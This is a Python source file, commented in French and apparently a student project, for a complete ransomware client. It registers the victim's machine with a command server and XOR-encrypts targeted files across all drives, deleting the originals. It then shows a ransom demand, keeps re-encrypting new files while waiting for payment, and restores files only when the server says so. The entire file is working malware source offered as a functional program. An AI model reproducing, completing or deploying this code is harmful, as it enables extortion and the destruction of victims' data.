"""
!!! Supprimer le fichier "config.json" pour une nouvelle execution (sinon le ransomware va penser qu'il a restart)
"""


import hashlib
import utile.network as network
import utile.message as message
import utile.security as security
import utile.config as config
import pickle
import platform
import datetime
import sys
import os.path
import re
from itertools import cycle
import time
import subprocess

TIMEOUT=20

#Compteur des fichiers chiffrés et déchiffrés (Globalisé dans la mémoire) (Modifications des dictionnaires se font en mémoire)
fichiers_chiffres={}
fichiers_dechiffres={}

DEBUG=True


def gen_hash(nom_sys, timestamp):
    """
    Génère le hash (nom_sys concaténé au timestamp) en SHA256

    :param nom_sys: Nom du PC de la victime
    :type nom_sys: str
    :param timestamp: timestamp de la création de la clé
    :type timestamp: float
    :return: La clé
    """
    concatene=nom_sys+str(timestamp)
    concatene=pickle.dumps(concatene)
    return hashlib.sha256(concatene).hexdigest()


def save_config(configuration):
    """
    Sauvegarde la configuration sur le disque en enlevant la clé de chiffrement

    :param configuration: La configuration sous forme d'un dictionnaire
    :type configuration: dict
    """
    configuration_save = configuration.copy()  # Crée une copie du dictionnaire pour ne pas modifier l'original dans la mémoire
    configuration_save.pop("KEY")  # Enleve la clé de chiffrement pour ne pas la stocker sur le disque
    config.write_config(configuration_save, "config")  # Ecriture de la config sur le disque
    if DEBUG:
        print("\nConfiguration mise à jour.\n")


def type_system(sysname):
    """

    :param sysname: Le nom complet du type de windows
    :type sysname: str
    :return: None ou le type de windows (Workstation ou Server)
    """
    if platform.system() == "Windows":
        type="Workstation"
        if re.search("[Ss]erver", sysname):
            type="Server"
        return type
    else:
        return None


def disques():
    """

    :return: Une chaine de caractère avec tous les disques disponibles sur le PC
    """
    lettres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    drives = ", ".join(['%s:' % d for d in lettres if os.path.exists('%s:' % d)])  # Technique du web
    return drives


def liste_fichiers(repertoire):
    """
    Liste tous les fichiers dans un répertoire

    :param repertoire: Chemin complet vers le repertoire ciblé (C:/exemple)
    :return: Liste de tous les fichiers
    """
    listOfFile = os.listdir(repertoire)
    allFiles = []
    for entry in listOfFile:
        # Prend le fullpath du fichier ou dossier
        fullPath = os.path.join(repertoire, entry)
        # Si c'est un dossier, on ajoute à la liste le resultat d'un nouvel appel à la fonction
        if os.path.isdir(fullPath):
            allFiles+=liste_fichiers(fullPath)
        else:  # Sinon on ajoute le chemin complet du fichier dans la liste
            allFiles.append(fullPath)

    return allFiles


def get_type_fichier(fichier):
    """
    Donne le type de fichier ou si c'est un dossier

    :param fichier: Chemin vers le fichier/dossier
    :return: "dir" si c'est un dossier, l'extension si c'est un fichier ou None si le chemin n'existe pas
    """
    if os.path.isdir(fichier):
        return "dir"  # Indique que c'est un dossier
    elif os.path.isfile(fichier):
        return os.path.splitext(fichier)[1]  # Renvoie l'extension


def total_fichiers(dict_fichiers):
    """
    Compte les fichiers regroupé par extension dans un dictionnaire

    :param dict_fichiers: Dictionnaire des extensions avec leur nombre
    :return: Le nombre total de fichiers
    """
    total=0
    for nombre in dict_fichiers.values():
        total+=nombre
    return total


def xor(data, key):  # Solution d'internet (adapté)
    """
    Fait un XOR "^" entre chaque byte des "data" et chaque byte de la clé
    (la clé est en "cycle" pour revenir au début des bytes de la clé quand on en a plus dans la clé) (on boucle dessus)

    :param data: les données binaire du fichier
    :param key: La clé de chiffrement
    :return: Les données binaire du fichier chiffré avec le XOR
    """
    return bytes([c^k for c,k in zip(data, cycle(key.encode()))])


def dechiffre(key, fichier):
    try:  # Try pour gérer toutes les erreurs possibles pour le déchiffrement d'un unique fichier
        fichier_original = open(os.path.splitext(fichier)[0], "wb")  # Ecriture du fichier rétabli en mode binaire (sans le .hack)
        fichier_hack = open(fichier, "rb")  # Lecture du fichier chiffré en mode binaire
        contenu = fichier_hack.read()

        # Decrypt (XOR)
        to_write = xor(contenu, key)  # Dechiffrement du contenu avec la clé grace au XOR

        fichier_original.write(to_write)
        fichier_original.close()
        fichier_hack.close()
        os.remove(fichier)
    except Exception as erreur:
        print(erreur)


def chiffre(key, fichier):
    try:  # Try pour gérer toutes les erreurs possibles pour le chiffrement d'un unique fichier
        fichier_original=open(fichier, "rb")
        fichier_hack=open(fichier+".hack", "wb")
        contenu=fichier_original.read()

        #Encrypt (XOR)
        to_write = xor(contenu, key)

        fichier_hack.write(to_write)
        fichier_original.close()
        fichier_hack.close()
        os.remove(fichier)
    except Exception as erreur:
        print(erreur)


def chiffre_tout(config_r, info=False):
    """
    Chiffrement de tout les fichiers avec la bonne extension dans tout les disques et tout les PATHS (dans la config)

    :param config_r: La config complete du ransomware
    :param info: Booléen, informations sur le chiffrement des fichiers
    :return:
    """

    date_actuelle=datetime.datetime.now()
    # Calcule la date à laquelle il faudra envoyer un message CRYPT au serveur frontal
    # On ajoute à la date actuelle le nombre de secondes dans la configuration grace à la fonction timedelta
    date_crypt=date_actuelle+datetime.timedelta(seconds=config_r["FREQ"])  # Ce qui donne une date future

    for disk in config_r["DISKS"]:
        for path in config_r["PATHS"]:
            for file in liste_fichiers(f"{disk}/{path}"):
                if get_type_fichier(file) in config_r["FILE_EXT"]:
                    extension_fichier = get_type_fichier(file)
                    chiffre(config_r["KEY"], file)
                    if extension_fichier in fichiers_chiffres.keys():  # Vérifie si le compteur pour cette extension existe
                        fichiers_chiffres[extension_fichier]+=1  # Si oui, on l'incrémente
                    else:
                        fichiers_chiffres[extension_fichier]=1  # Si non, on l'initialise
                    if info:
                        print(f"{file} chiffré")

                # A chaque fichier parcouru, verification s'il ne faut pas à nouveau envoyer un message "CRYPT"
                # (C'est le cas si la date d'envoie du message est plus petite ou égal à la date actuelle)
                if date_crypt<=datetime.datetime.now():
                    s_cli = network.conn_serv(port=8443) # Connexion au serveur
                    # Hellman (clé)
                    cle_chiffrement = security.hellman_client(
                        s_cli)  # La clé commune de chiffrement avec le serveur frontal
                    msg = pickle.dumps(message.set_msg("CRYPT", [config_r["ID"]]))
                    network.send_msg(s_cli, security.encrypt(msg,
                                                             cle_chiffrement))  # Envoie du message CRYPT vers le serv frontal
                    s_cli.close()  # Fermeture de la session

                    # Recréation de la nouvelle date d'envoie
                    date_actuelle = datetime.datetime.now()
                    date_crypt=date_actuelle+datetime.timedelta(seconds=config_r["FREQ"])


def dechiffre_tout(config_r, info=False):
    """
    Dechiffrement de tout les fichiers avec la bonne extension (.hack) dans tout les disques et tout les PATHS (dans la config)
    :param config_r: La config complete du ransomware
    :param info: Booléen, informations sur le déchiffrement des fichiers
    :return:
    """
    for disk in config_r["DISKS"]:
        for path in config_r["PATHS"]:
            for file in liste_fichiers(f"{disk}/{path}"):
                if get_type_fichier(file) == ".hack":
                    dechiffre(config_r["KEY"], file)
                    extension_fichier = get_type_fichier(os.path.splitext(file)[0])
                    if extension_fichier in fichiers_dechiffres.keys():  # Vérifie si le compteur pour cette extension existe
                        fichiers_dechiffres[extension_fichier] += 1  # Si oui, on l'incrémente
                    else:
                        fichiers_dechiffres[extension_fichier] = 1  # Si non, on l'initialise
                    if info:
                        print(f"{file} dechiffré")


def initialize():
    if DEBUG:
        print("\n==========\nDébut phase: INITIALIZE\n")

    #Informations sur le PC de la victime

    if platform.system() != "Windows":
        return None

    hostname = platform.node()  # Nom du PC de la victime
    sysname = platform.win32_edition()
    type_windows = type_system(sysname)
    timestamp = datetime.datetime.now().timestamp()
    disques_disponibles=disques()

    s_cli=network.conn_serv(port=8443) #Connexion au serveur

    # Hellman (clé)
    cle_chiffrement = security.hellman_client(s_cli)  # La clé commune de chiffrement avec le serveur frontal

    hash_gen=gen_hash(hostname, timestamp)
    msg=message.set_msg("INITIALIZE", [hash_gen, type_windows, disques_disponibles])
    if DEBUG:
        print(f"Envoie du message : \n{msg}\n")
    msg=pickle.dumps(msg)

    network.send_msg(s_cli, security.encrypt(msg, cle_chiffrement)) #Envoie du message INITIALIZE vers le serv frontal
    s_cli.settimeout(TIMEOUT) #Ajoute un timeout de 20 secondes
    msg=network.receiv_msg(s_cli)
    s_cli.close()  # Fermeture de la session
    if not msg:
        print("Configuration non reçue (timeout)")
        sys.exit()
    msg=security.decrypt(msg, cle_chiffrement)
    msg=pickle.loads(msg)

    if DEBUG:
        print(f"Message reçu : \n{msg}")

    msg["SETTING"]["HASH"] = hash_gen  # Ajout du hash dans la config reçue
    msg["SETTING"]["ID"] = msg["CONFIGURE"]  # Ajout de l'ID dans la config
    save_config(msg["SETTING"])  # Sauvegarde de la config sur le disque
    if DEBUG:
        print("\nFin phase: INITIALIZE\n==========")
    return msg["SETTING"]  # Renvoie de la config


def restart(id_victim):
    if DEBUG:
        print("\n==========\nDébut phase: RESTART\n")

    s_cli = network.conn_serv(port=8443)  # Connexion au serveur

    # Hellman (clé)
    cle_chiffrement = security.hellman_client(s_cli)  # La clé commune de chiffrement avec le serveur frontal
    msg=message.set_msg("RESTART", [id_victim])
    if DEBUG:
        print(f"Envoie du message : \n{msg}\n")
    msg = pickle.dumps(msg)
    network.send_msg(s_cli, security.encrypt(msg, cle_chiffrement))  # Envoie du message RESTART vers le serv frontal
    s_cli.settimeout(TIMEOUT)  # Ajoute un timeout de 20 secondes
    msg = network.receiv_msg(s_cli)
    s_cli.close()  # Fermeture de la session
    if not msg:
        print("Clé non reçue (timeout)")
        sys.exit()
    msg = security.decrypt(msg, cle_chiffrement)
    msg = pickle.loads(msg)

    if DEBUG:
        print(f"Message reçu (clé) : \n{msg}")
        print("\nFin phase: RESTART\n==========")

    return msg["KEY"]  # Return la clé


def crypt(config_v):
    if DEBUG:
        print("\n==========\nDébut phase: CRYPT\n")

    s_cli = network.conn_serv(port=8443)  # Connexion au serveur
    # Hellman (clé)
    cle_chiffrement = security.hellman_client(s_cli)  # La clé commune de chiffrement avec le serveur frontal
    msg=message.set_msg("CRYPT", [config_v["ID"]])
    if DEBUG:
        print(f"Envoie du message : \n{msg}\n")
    msg = pickle.dumps(msg)
    network.send_msg(s_cli, security.encrypt(msg, cle_chiffrement))  # Envoie du message CRYPT vers le serv frontal
    s_cli.close()  # Fermeture de la session

    # Chiffrement des fichiers de la victime
    chiffre_tout(config_v, info=DEBUG)
    if DEBUG:
        print(f"\nFichiers crypté : {total_fichiers(fichiers_chiffres)}\n-->{fichiers_chiffres}\n")
    # Passage au state PENDING et ajout des fichiers par extension + écriture
    config_v["STATE"]="PENDING"
    config_v["FICHIERS"]=fichiers_chiffres
    save_config(config_v)
    print("\nFin phase: CRYPT\n==========")


def pending(config_v):
    if DEBUG:
        print("\n==========\nDébut phase: PENDING\n")
    msg = {"non_recu": "non_recu"}
    # Boucle pour attendre le payement de la rançon avec le chiffrement des fichiers et l'envoie des messages PENDING
    # Jusqu'à reception d'un message DECRYPT
    while message.get_message_type(msg)!="DECRYPT":
        # Envoie de PENDING + attente de réponse (10 secondes)

        s_cli = network.conn_serv(port=8443)  # Connexion au serveur
        # Hellman (clé)
        cle_chiffrement = security.hellman_client(s_cli)  # La clé commune de chiffrement avec le serveur frontal
        msgg=message.set_msg("PENDING", [config_v["ID"], total_fichiers(fichiers_chiffres)])
        if DEBUG:
            print(f"Envoie du message : \n{msgg}\n")
        msgg = pickle.dumps(msgg)
        network.send_msg(s_cli,
                         security.encrypt(msgg, cle_chiffrement))  # Envoie du message PENDING vers le serv frontal
        s_cli.settimeout(15)  # Ajoute un timeout de 10 secondes
        msg=network.receiv_msg(s_cli)
        s_cli.close()  # Fermeture de la session

        if msg:  # Message reçu -> (DECRYPT)
            msg = security.decrypt(msg, cle_chiffrement)
            msg = pickle.loads(msg)
            if DEBUG:
                print(f"Message reçu (DECRYPT) : \n{msg}\n")
            config_v["STATE"] = "DECRYPT"
            save_config(config_v)  # Sauvegarde de l'état decrypt

        else:  # Message non reçu -> Continue de chiffrer les fichiers après le nombre de secondes dans la config
            # avant de renvoyer le message pending
            msg = {"non_recu":"non_recu"}
            if DEBUG:
                print(f"Message DECRYPT non reçu --> Sleep pendant {config_v['FREQ']} secondes\n")

            # Valeur de test   =>   bon code = time.sleep(config_v["FREQ"])
            time.sleep(10)  # Attente avant de réessayer et de rechiffrer

            if DEBUG:
                print(f"Chiffrement à nouveau des fichiers (Si des nouveaus ont été créé)...\n")
            chiffre_tout(config_v)
            config_v["FICHIERS"] = fichiers_chiffres
            save_config(config_v)  # Mise à jour sur disque du nombre de fichiers chiffrés
    if DEBUG:
        print("\nFin phase: PENDING\n==========")


def main():
    global fichiers_chiffres, fichiers_dechiffres  # En global ici car on réaffecte les variables si il y a un restart
    configuration=config.get_config("config")
    if configuration:  # Si il y a une config, c'est que le ransomware a restart -> récupération de la clé
        key=restart(configuration["ID"])
        configuration["KEY"]=key  # Ajout de la clé dans la configuration
        if configuration["STATE"] in ("PENDING", "DECRYPT", "PROTECTED"):  # Récupération des fichiers si on a restart dans un de ces states
            fichiers_chiffres=configuration["FICHIERS"]
        if configuration["STATE"] == "PROTECTED":
            fichiers_dechiffres=configuration["FICHIERS_DECHIFFRE"]
    else:  # Si non (pas de config) on fait un INITIALIZE qui va return la config
        configuration=initialize()
    if not configuration:
        sys.exit()

    if DEBUG:
        print(f"\nConfiguration : {configuration}\n")

    # Si le STATE est INITIALIZE on lance la phase CRYPT
    if configuration["STATE"] == "INITIALIZE":
        configuration["STATE"] = "CRYPT"  # Changement de l'état à CRYPT + sauvegarde
        save_config(configuration)
        crypt(configuration)  # Phase CRYPT
    # Si le STATE est CRYPT, on lance la phase CRYPT et on passe à la phase PENDING une fois terminée
    # Et ainsi de suite pour chaque ETAT
    if configuration["STATE"] == "CRYPT":
        crypt(configuration)
    if configuration["STATE"] == "PENDING":
        subprocess.Popen("python DEMANDE_DE_RANCON.py")  # Affichage en Tkinter de demande de rançon
        pending(configuration)
    if configuration["STATE"] == "DECRYPT":
        if DEBUG:
            print("\n==========\nDébut phase: DECRYPT\n")
        dechiffre_tout(configuration, info=DEBUG)
        if DEBUG:
            print(f"\nFichiers décrypté : {total_fichiers(fichiers_dechiffres)}\n-->{fichiers_dechiffres}\n")
        configuration["STATE"] = "PROTECTED"
        configuration["FICHIERS_DECHIFFRE"] = fichiers_dechiffres
        save_config(configuration)  # Sauvegarde de l'état PROTECTED
        print("\nFin phase: DECRYPT\n==========")
    if configuration["STATE"] == "PROTECTED":
        if DEBUG:
            print("\n==========\nDébut phase: PROTECTED\n")
        s_cli = network.conn_serv(port=8443)  # Connexion au serveur
        # Hellman (clé)
        cle_chiffrement = security.hellman_client(s_cli)  # La clé commune de chiffrement avec le serveur frontal
        msgg = message.set_msg("PROTECTREQ", [configuration["ID"], total_fichiers(fichiers_dechiffres)])
        if DEBUG:
            print(f"\nMessage envoyé : \n{msgg}\n")
        msgg = pickle.dumps(msgg)
        network.send_msg(s_cli, security.encrypt(msgg, cle_chiffrement))  # Envoie du message PENDING vers le serv frontal
        msg = network.receiv_msg(s_cli)
        s_cli.close()  # Fermeture de la session
        msg = security.decrypt(msg, cle_chiffrement)
        msg = pickle.loads(msg)
        if DEBUG:
            print(f"Message reçu : \n{msg}\n")
        print("\nFin phase: PROTECTED\n==========")

        print("\n\n"+msg["MESSAGE"])  # Affichage du message de fin d'attaque

        subprocess.Popen("python MESSAGE_DU_RANSOMWARE.py " + msg["MESSAGE"])  # Affichage en Tkinter du message (avec des arguments à l'execution) -> le message


if __name__ == "__main__":
    main()
